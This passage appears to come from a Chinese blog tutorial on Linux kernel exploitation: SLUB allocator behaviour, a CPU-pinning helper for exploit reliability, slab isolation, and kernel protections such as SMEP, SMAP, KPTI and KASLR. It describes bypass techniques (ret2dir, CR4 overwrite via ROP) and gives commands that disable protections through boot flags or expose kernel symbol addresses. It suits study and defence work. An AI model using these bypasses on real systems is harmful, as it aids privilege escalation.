可分配，此时 per cpu partial 链表中有可用 slab 用于分配，那么就会从 per
cpu partial 链表中取下一个 slab 用于分配 obj。如下图所示。 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3b2a9a9ff98bb492fa0cfef2dc1490f6.png"
                     
                     
alt="5.png" 
                
                ></p></li>
<li><p>随着正在使用的 slab 中 obj 的一个个分配出去，最终会无 obj
可分配，此时 per cpu partial 链表也为空，此时发现 per node partial
链表中有可用 slab 用于分配，那么就会从 per node partial 链表中取下一个
slab 用于分配 obj。如下图所示。<img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/e9439ea41be5d91a1bc8789c50e098ff.png"
                     
                     
alt="6.png" 
                
                ></p></li>
</ul>
<h4 id="slub-释放">slub 释放</h4>
<figure>
<img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/06ab07e03d42cc6bd7f1079a157d0c6f.png"
                     
                      alt="7.png" 
                
                >
<figcaption aria-hidden="true">7.png</figcaption>
</figure>
<ul>
<li>假设下图左边的情况下释放 obj，如果满足 kmem_cache_node 的 nr_partial
大于 kmem_cache 的 min_partial 的话，释放情况如下图所示。 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/8ee336b6de8e8263a5dfa2dad69c99dc.png"
                     
                      alt="8.png" 
                
                ></li>
<li>假设下图左边的情况下释放 obj，如果不满足 kmem_cache_node 的
nr_partial 大于 kmem_cache 的 min_partial 的话，释放情况如下图所示。
<img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/11bad950de73843bef8e1716a85bdb0c.png"
                     
                     
alt="9.png" 
                
                ></li>
<li>假设下图从 full slab 释放 obj 的话，如果满足 per cpu partial
管理的所有 slab 的 free object 数量大于 kmem_cache 的 cpu_partial
成员的话的话，将 per cpu partial 链表管理的所有 slab 移动到 per node
partial 链表管理，释放情况如下图所示。 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/583c765a6df44d6ffd56e4f506174318.png"
                     
                      alt="10.png" 
                
                ></li>
<li>假设下图从 full slab 释放 obj 的话，如果不满足 per cpu partial
管理的所有 slab 的 free object 数量大于 kmem_cache 的 cpu_partial
成员的话的话，释放情况如下图所示。 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0dc462afb4eebcf420803eca2491f169.png"
                     
                      alt="11.png" 
                
                ></li>
</ul>
<h4 id="内核堆利用与绑核">内核堆利用与绑核</h4>
<p>slub allocator 会优先从当前核心的 <code>kmem_cache_cpu</code>
中进行内存分配，在多核架构下存在多个 <code>kmem_cache_cpu</code>
，由于进程调度算法会保持核心间的负载均衡，因此我们的 exp
进程可能会被在不同的核心上运行，这也就导致了利用过程中 kernel object
的分配有可能会来自不同的 <code>kmem_cache_cpu</code>
，这使得利用模型变得复杂，也降低了漏洞利用的成功率。</p>
<p>因此为了保证漏洞利用的稳定，<strong>我们需要将我们的进程绑定到特定的某个
CPU 核心上</strong>，这样 slub allocator 的模型对我们而言便简化成了
<code>kmem_cache_node + kmem_cache_cpu</code>
，我们也能更加方便地进行漏洞利用</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">randint</span><span class="params">(<span class="type">int</span> min, <span class="type">int</span> max)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> min + (rand() % (max - min));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">bool</span> fixed, <span class="type">bool</span> thread)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(fixed ? <span class="number">0</span> : randint(<span class="number">1</span>, get_nprocs()), &amp;cpu_set);</span><br><span class="line">    <span class="keyword">if</span> (thread) &#123;</span><br><span class="line">        pthread_setaffinity_np(pthread_self(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="通用-kmalloc-flag">通用 kmalloc flag</h4>
<p><code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code>
是内核中最为常见与通用的分配 flag，常规情况下他们的分配都来自同一个
<code>kmem_cache</code> ——即通用的 <code>kmalloc-xx</code></p>
<p>这两种 flag 的区别主要在于 <code>GFP_KERNEL_ACCOUNT</code> 比
<code>GFP_KERNEL</code>
多了一个属性——<strong>表示该对象与来自用户空间的数据相关联</strong>，因此我们可以看到诸如
<code>msg_msg</code>
、<code>pipe_buffer</code>、<code>sk_buff的数据包</code>
的分配使用的都是 <code>GFP_KERNEL_ACCOUNT</code> ，而
<code>ldt_struct</code> 、<code>packet_socket</code>
等与用户空间数据没有直接关联的结构体则使用 <code>GFP_KERNEL</code></p>
<p>在5.9 版本之前<code>GFP_KERNEL</code> 与
<code>GFP_KERNEL_ACCOUNT</code> 存在隔离机制，在 <a class="link" 
 target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/10befea91b61c4e2c2d1df06a2e978d182fcf792" >这个
commit<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i> 中取消了隔离机制，自内核版本 5.14 起，在 <a class="link" 
 target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/494c1dfe855ec1f70f89552fce5eadf4a1717552" >这个
commit<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i> 当中又重新引入：</p>
<ul>
<li>对于开启了 <code>CONFIG_MEMCG_KMEM</code> 编译选项的 kernel
而言（通常都是默认开启），其会为使用 <code>GFP_KERNEL_ACCOUNT</code>
进行分配的通用对象<strong>创建一组独立的 <code>kmem_cache</code> ——名为
<code>kmalloc-cg-\*</code></strong> ，从而导致使用这两种 flag 的 object
之间的隔离：</li>
</ul>
<h4 id="slab-alias">slab alias</h4>
<p>slab alias 机制是一种对同等/相近大小 object 的
<code>kmem_cache</code> 进行<strong>复用</strong>的一种机制：当一个
<code>kmem_cache</code> 在创建时，若已经存在能分配相等/近似大小的 object
的 <code>kmem_cache</code> ，则<strong>不会创建新的
kmem_cache，而是为原有的 kmem_cache 起一个 alias，作为“新的” kmem_cache
返回</strong>。</p>
<p>例如 <code>cred_jar</code> 是专门用以分配 <code>cred</code> 结构体的
<code>kmem_cache</code>，在 Linux 4.4 之前的版本中，其为
<code>kmalloc-192</code> 的 alias，即 cred 结构体与其他的 192 大小的
object 都会从同一个 <code>kmem_cache</code>——<code>kmalloc-192</code>
中分配。</p>
<p>对于初始化时设置了 <code>SLAB_ACCOUNT</code> 这一 flag 的
<code>kmem_cache</code> 而言，则会新建一个新的 <code>kmem_cache</code>
而非为原有的建立 alias，例如在新版的内核当中 <code>cred_jar</code> 与
<code>kmalloc-192</code> 便是两个独立的
<code>kmem_cache</code>，<strong>彼此之间互不干扰</strong>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Account to memcg */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG_KMEM</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> SLAB_ACCOUNT		((slab_flags_t __force)0x04000000U)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> SLAB_ACCOUNT		0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * initialise the credentials stuff</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* allocate a slab in which we can store credentials */</span></span><br><span class="line">	cred_jar = kmem_cache_create(<span class="string">&quot;cred_jar&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred), <span class="number">0</span>,</span><br><span class="line">			SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="内核保护机制">内核保护机制</h2>
<h3 id="空间隔离相关">空间隔离相关</h3>
<h4 id="smep">SMEP</h4>
<p>管理模式执行保护（Superivisor Mode Access
Protection），禁止内核执行用户空间代码。当处理器处于<code>ring 0</code>模式，执行用户空间的代码会触发页错误。<code>Linux</code>下叫做<code>PXN</code>。</p>
<h4 id="smap">SMAP</h4>
<p>管理模式访问保护（Supervisor Mode Access
Prevention），禁止内核访问用户地址空间，类似于<code>smep</code>。当处理器处于<code>ring 0</code>模式，访问用户空间的数据会触发页错误。<code>ARM</code>下叫做<code>PAN</code>（Privileged
Access Never）</p>
<ul>
<li>对于没有<code>SMAP/SMEP</code>的情况下把内核指针重定向到用户空间的利用方式称为<code>ret2usr</code>。</li>
<li>上面两种保护的绕过方法：
<ol type="1">
<li><code>physmap</code>是内核管理的一块非常大的连续的虚拟地址空间，为了提高效率，该地址空间和内存地址直接映射。内存地址相对<code>physmap</code>要小的多，导致了任何一个内存地址可以在<code>physmap</code>中找到对应的虚拟内存地址。我们知道用户空间的虚拟内存也会映射到内存地址，<strong>这就存在了连续虚拟内存地址映射到了同一个内存地址的情况</strong>。也就是说，我们在用户空间里创建的数据，<strong>代码就很有可能映射到<code>physmap</code>空间</strong>。那么在用户空间用<code>mmap()</code>将提权代码映射到内存，然后再在内核空间里找到其对应的副本，修改<code>IP</code>调到副本执行就可以了。因为<code>physmap</code>本身就在内核空间里，这种漏洞利用方式叫做<code>ret2dir</code>。</li>
<li><code>Intel</code>下系统根据<code>CR4</code>控制寄存器的第<code>20</code>位标识是否开启<code>SMEP</code>保护，若能够通过<code>kernel ROP</code>改变<code>CR4</code>寄存器的值便能够关闭<code>SMEP</code>保护，完成<code>SMEP-bypass</code>，接下来就可以重新<code>ret2usr</code>。</li>
</ol></li>
<li>关闭<code>SMEP</code>方法：修改<code>/etc/default/grub</code>文件中的<code>GRUB_CMDLINE_LINUX=</code>,加上<code>nosmep/nosmap/nokaslr</code>，然后<code>update-grub</code>就可以。</li>
</ul>
<h4 id="kpti">KPTI</h4>
<p><code>KPTI</code>（Kernel PageTable
Isolation），内核页表隔离，进程页表隔离。进程地址空间被分成了内核地址空间和用户地址空间，内核地址都是共享的，用户空间只能单独使用。为了防止用户程序获取内核数据，可以让用户地址空间和内核地址空间使用两组页表集。<code>Windows</code>称为<code>KVA Shadow</code>。</p>
<p>由于有<code>KPTI</code>保护，即使关闭了<code>smep</code>和<code>smap</code>，也不能执行<code>用户区间的代码</code>，只能读，原因如下：
不隔离不意味着完全相同，填充内核态页表项时，<code>KPTI</code>
会给页表项加上 <code>_PAGE_NX</code>
标志，以阻止执行内核态页表所映射用户地址空间的代码。在
<code>KAISER patch</code> 里把这一步骤叫
毒化（<code>poison</code>）。</p>
<p>检查方式：查看
<code>/sys/devices/system/cpu/vulnerabilities/*</code></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">Processor vulnerable</span><br><span class="line">Mitigation: PTE Inversion</span><br><span class="line">Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Vulnerable</span><br><span class="line">Mitigation: usercopy/swapgs barriers and __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpoline, STIBP: disabled, RSB filling</span><br><span class="line">Not affected</span><br></pre></td></tr></table></figure></div>
<p><strong>注意，KPTI
只是不能执行用户空间代码，不代表不能访问用户空间数据，如果关闭 SMAP
即使开启 KPTI 也是可以访问用户数据的。</strong></p>
<p>在启动脚本中设置 <code>-append "... kpti=1 ..."</code>（或
<code>pti=on</code>）即可开启 KPTI ，另外还需要设置
<code>-cpu kvm64</code> 。</p>
<h3 id="地址相关">地址相关</h3>
<h4 id="kaslr">KASLR</h4>
<p>内核地址空间布局随机化（Kernel Address Space Layout
Randomization），开启后，允许<code>kernel image</code>加载到<code>VMALLOC</code>区域的任何位置。
间在未开启KASLR保护机制时，内核代码段的基址为 0xffffffff81000000
，direct mapping area 的基址为 0xffff888000000000 。</p>
<h4 id="fg_kaslr">FG_KASLR</h4>
<p>FG-KASLR （Function Granular Kernel Address Space Layout
Randomization）：细粒度的kaslr，函数级别上的 KASLR 优化。
<strong>注意，该保护只是在代码段打乱顺序，在数据段偏移不变，例如
<code>commit_creds</code> 函数的偏移改变但是 <code>init_cred</code>
的偏移不变。</strong></p>
<h4 id="mmap_min_addr">MMAP_MIN_ADDR</h4>
<p>内核空间和用户空间共享虚拟内存地址，因此需要防止用户空间 mmap
的内存从 0 开始，从而缓解空指针引用攻击。windows 系统从 win8
开始禁止在零页分配内存。从 linux 内核 2.6.22 开始可以使用 sysctl 设置
<code>mmap_min_addr</code> 来实现这一保护。</p>
<h3 id="信息相关">信息相关</h3>
<h4 id="dmesg-restrictions">Dmesg Restrictions</h4>
<p>通过设置<code>/proc/sys/kernel/dmesg_restrict</code>为1，可以将<code>dmesg</code>输出的信息视为敏感信息（默认为0）</p>
<h4 id="kernel-address-display-restriction">Kernel Address Display
Restriction</h4>
<p>内核提供控制变量 <code>/proc/sys/kernel/kptr_restrict</code>
用于控制内核的一些输出打印。</p>
<ul>
<li><code>kptr_restrict == 2</code> :内核将符号地址打印为全 0 , root
和普通用户都没有权限.</li>
<li><code>kptr_restrict == 1</code> : root
用户有权限读取,普通用户没有权限.</li>
<li><code>kptr_restrict == 0</code> : root 和普通用户都可以读取.
<code>/proc/kallsyms</code>的内容需要<code>root</code>权限才能查看，如果以非<code>root</code>用户权限查看将显示地址为<code>0</code></li>
</ul>
<p><code>kallsyms</code>
抽取了内核用到的所有函数地址(全局的,静态的)和非栈数据变量地址,生成一个数据块,作为只读数据链接进
<code>kernel image</code> 。 要在内核中启用 <code>kallsyms</code>
功能,须设置 <code>CONFIG_KALLSYMS</code> 选项为 <code>y</code> ,如果要在
<code>kallsyms</code> 中包含全部符号信息,须设置
<code>CONFIG_KALLSYMS_ALL</code> 为 <code>y</code> 。
<code>kallsyms</code> 表位于 <code>/proc/kallsyms</code>
，<code>kernel</code> 中的 <code>mod_tree</code>
处存放着各个模块加载的地址.</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w kernel.kptr_restrict=0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置权限</span></span><br><span class="line">cat /proc/kallsyms</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出所有内核符号</span></span><br><span class="line">grep mod_tree /proc/kallsyms</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出各个模块加载的地址</span></span><br><span class="line">cat /proc/modules</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出系统中已经加载的模块及其地址</span></span><br><span class="line">grep _text /proc/kallsyms</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">vmlinux加载地址</span></span><br></pre></td></tr></table></figure></div>
<p><img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a7779218e2c579413905c3686109f346.png"
                     
                      
                
                ></p>
<h3 id="数据相关">数据相关</h3>
<h4 id="hardened_usercopy">HARDENED_USERCOPY</h4>
<p>hardened usercopy
是用以在用户空间与内核空间之间拷贝数据时进行越界检查的一种防护机制，主要检查拷贝过程中对内核空间中数据的读写是否会越界：</p>
<p>读取的数据长度是否超出源 object 范围 写入的数据长度是否超出目的
object 范围 不过这种保护 不适用于内核空间内的数据拷贝
，这也是目前主流的绕过手段</p>
<p>这一保护被用于在使用 <code>copy_to_user()</code> 与
<code>copy_from_user()</code> 等数据交换 API 时用
<code>__check_object_size</code> 检查是否越界。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HARDENED_USERCOPY</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Rejects incorrectly sized objects and objects that are to be copied</span></span><br><span class="line"><span class="comment"> * to/from userspace but do not fall entirely within the containing slab</span></span><br><span class="line"><span class="comment"> * cache&#x27;s usercopy region.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns NULL if check passes, otherwise const char * to name of cache</span></span><br><span class="line"><span class="comment"> * to indicate an error.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __check_heap_object(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n, <span class="keyword">struct</span> page *page,</span><br><span class="line">			 <span class="type">bool</span> to_user)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">	<span class="type">size_t</span> object_size;</span><br><span class="line"></span><br><span class="line">	ptr = kasan_reset_tag(ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Find object and usable object size. */</span></span><br><span class="line">	s = page-&gt;slab_cache;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Reject impossible pointers. */</span></span><br><span class="line">	<span class="keyword">if</span> (ptr &lt; page_address(page))</span><br><span class="line">		usercopy_abort(<span class="string">&quot;SLUB object not in SLUB page?!&quot;</span>, <span class="literal">NULL</span>,</span><br><span class="line">			       to_user, <span class="number">0</span>, n);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Find offset within object. */</span></span><br><span class="line">	offset = (ptr - page_address(page)) % s-&gt;size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Adjust for redzone and reject if within the redzone. */</span></span><br><span class="line">	<span class="keyword">if</span> (kmem_cache_debug(s) &amp;&amp; s-&gt;flags &amp; SLAB_RED_ZONE) &#123;</span><br><span class="line">		<span class="keyword">if</span> (offset &lt; s-&gt;red_left_pad)</span><br><span class="line">			usercopy_abort(<span class="string">&quot;SLUB object in left red zone&quot;</span>,</span><br><span class="line">				       s-&gt;name, to_user, offset, n);</span><br><span class="line">		offset -= s-&gt;red_left_pad;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allow address range falling entirely within usercopy region. */</span></span><br><span class="line">	<span class="keyword">if</span> (offset &gt;= s-&gt;useroffset &amp;&amp;</span><br><span class="line">	    offset - s-&gt;useroffset &lt;= s-&gt;usersize &amp;&amp;</span><br><span class="line">	    n &lt;= s-&gt;useroffset - offset + s-&gt;usersize)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If the copy is still within the allocated object, produce</span></span><br><span class="line"><span class="comment">	 * a warning instead of rejecting the copy. This is intended</span></span><br><span class="line"><span class="comment">	 * to be a temporary method to find any missing usercopy</span></span><br><span class="line"><span class="comment">	 * whitelists.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	object_size = slab_ksize(s);</span><br><span class="line">	<span class="keyword">if</span> (usercopy_fallback &amp;&amp;</span><br><span class="line">	    offset &lt;= object_size &amp;&amp; n &lt;= object_size - offset) &#123;</span><br><span class="line">		usercopy_warn(<span class="string">&quot;SLUB object&quot;</span>, s-&gt;name, to_user, offset, n);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	usercopy_abort(<span class="string">&quot;SLUB object&quot;</span>, s-&gt;name, to_user, offset, n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_HARDENED_USERCOPY */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">check_heap_object</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n,</span></span><br><span class="line"><span class="params">				     <span class="type">bool</span> to_user)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    ...</span><br><span class="line">	page = virt_to_head_page(ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (PageSlab(page)) &#123;</span><br><span class="line">		<span class="comment">/* Check slab allocator for flags and size. */</span></span><br><span class="line">		__check_heap_object(ptr, n, page, to_user);</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Checks if a given pointer and length is contained by the current</span></span><br><span class="line"><span class="comment"> * stack frame (if possible).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns:</span></span><br><span class="line"><span class="comment"> *	NOT_STACK: not at all on the stack</span></span><br><span class="line"><span class="comment"> *	GOOD_FRAME: fully within a valid stack frame</span></span><br><span class="line"><span class="comment"> *	GOOD_STACK: fully on the stack (when can&#x27;t do frame-checking)</span></span><br><span class="line"><span class="comment"> *	BAD_STACK: error condition (invalid stack position or bad stack frame)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> noinline <span class="type">int</span> <span class="title function_">check_stack_object</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *obj, <span class="type">unsigned</span> <span class="type">long</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">void</span> * <span class="type">const</span> <span class="built_in">stack</span> = task_stack_page(current);</span><br><span class="line">	<span class="type">const</span> <span class="type">void</span> * <span class="type">const</span> stackend = <span class="built_in">stack</span> + THREAD_SIZE;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Object is not on the stack at all. */</span></span><br><span class="line">	<span class="keyword">if</span> (obj + len &lt;= <span class="built_in">stack</span> || stackend &lt;= obj)</span><br><span class="line">		<span class="keyword">return</span> NOT_STACK;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Reject: object partially overlaps the stack (passing 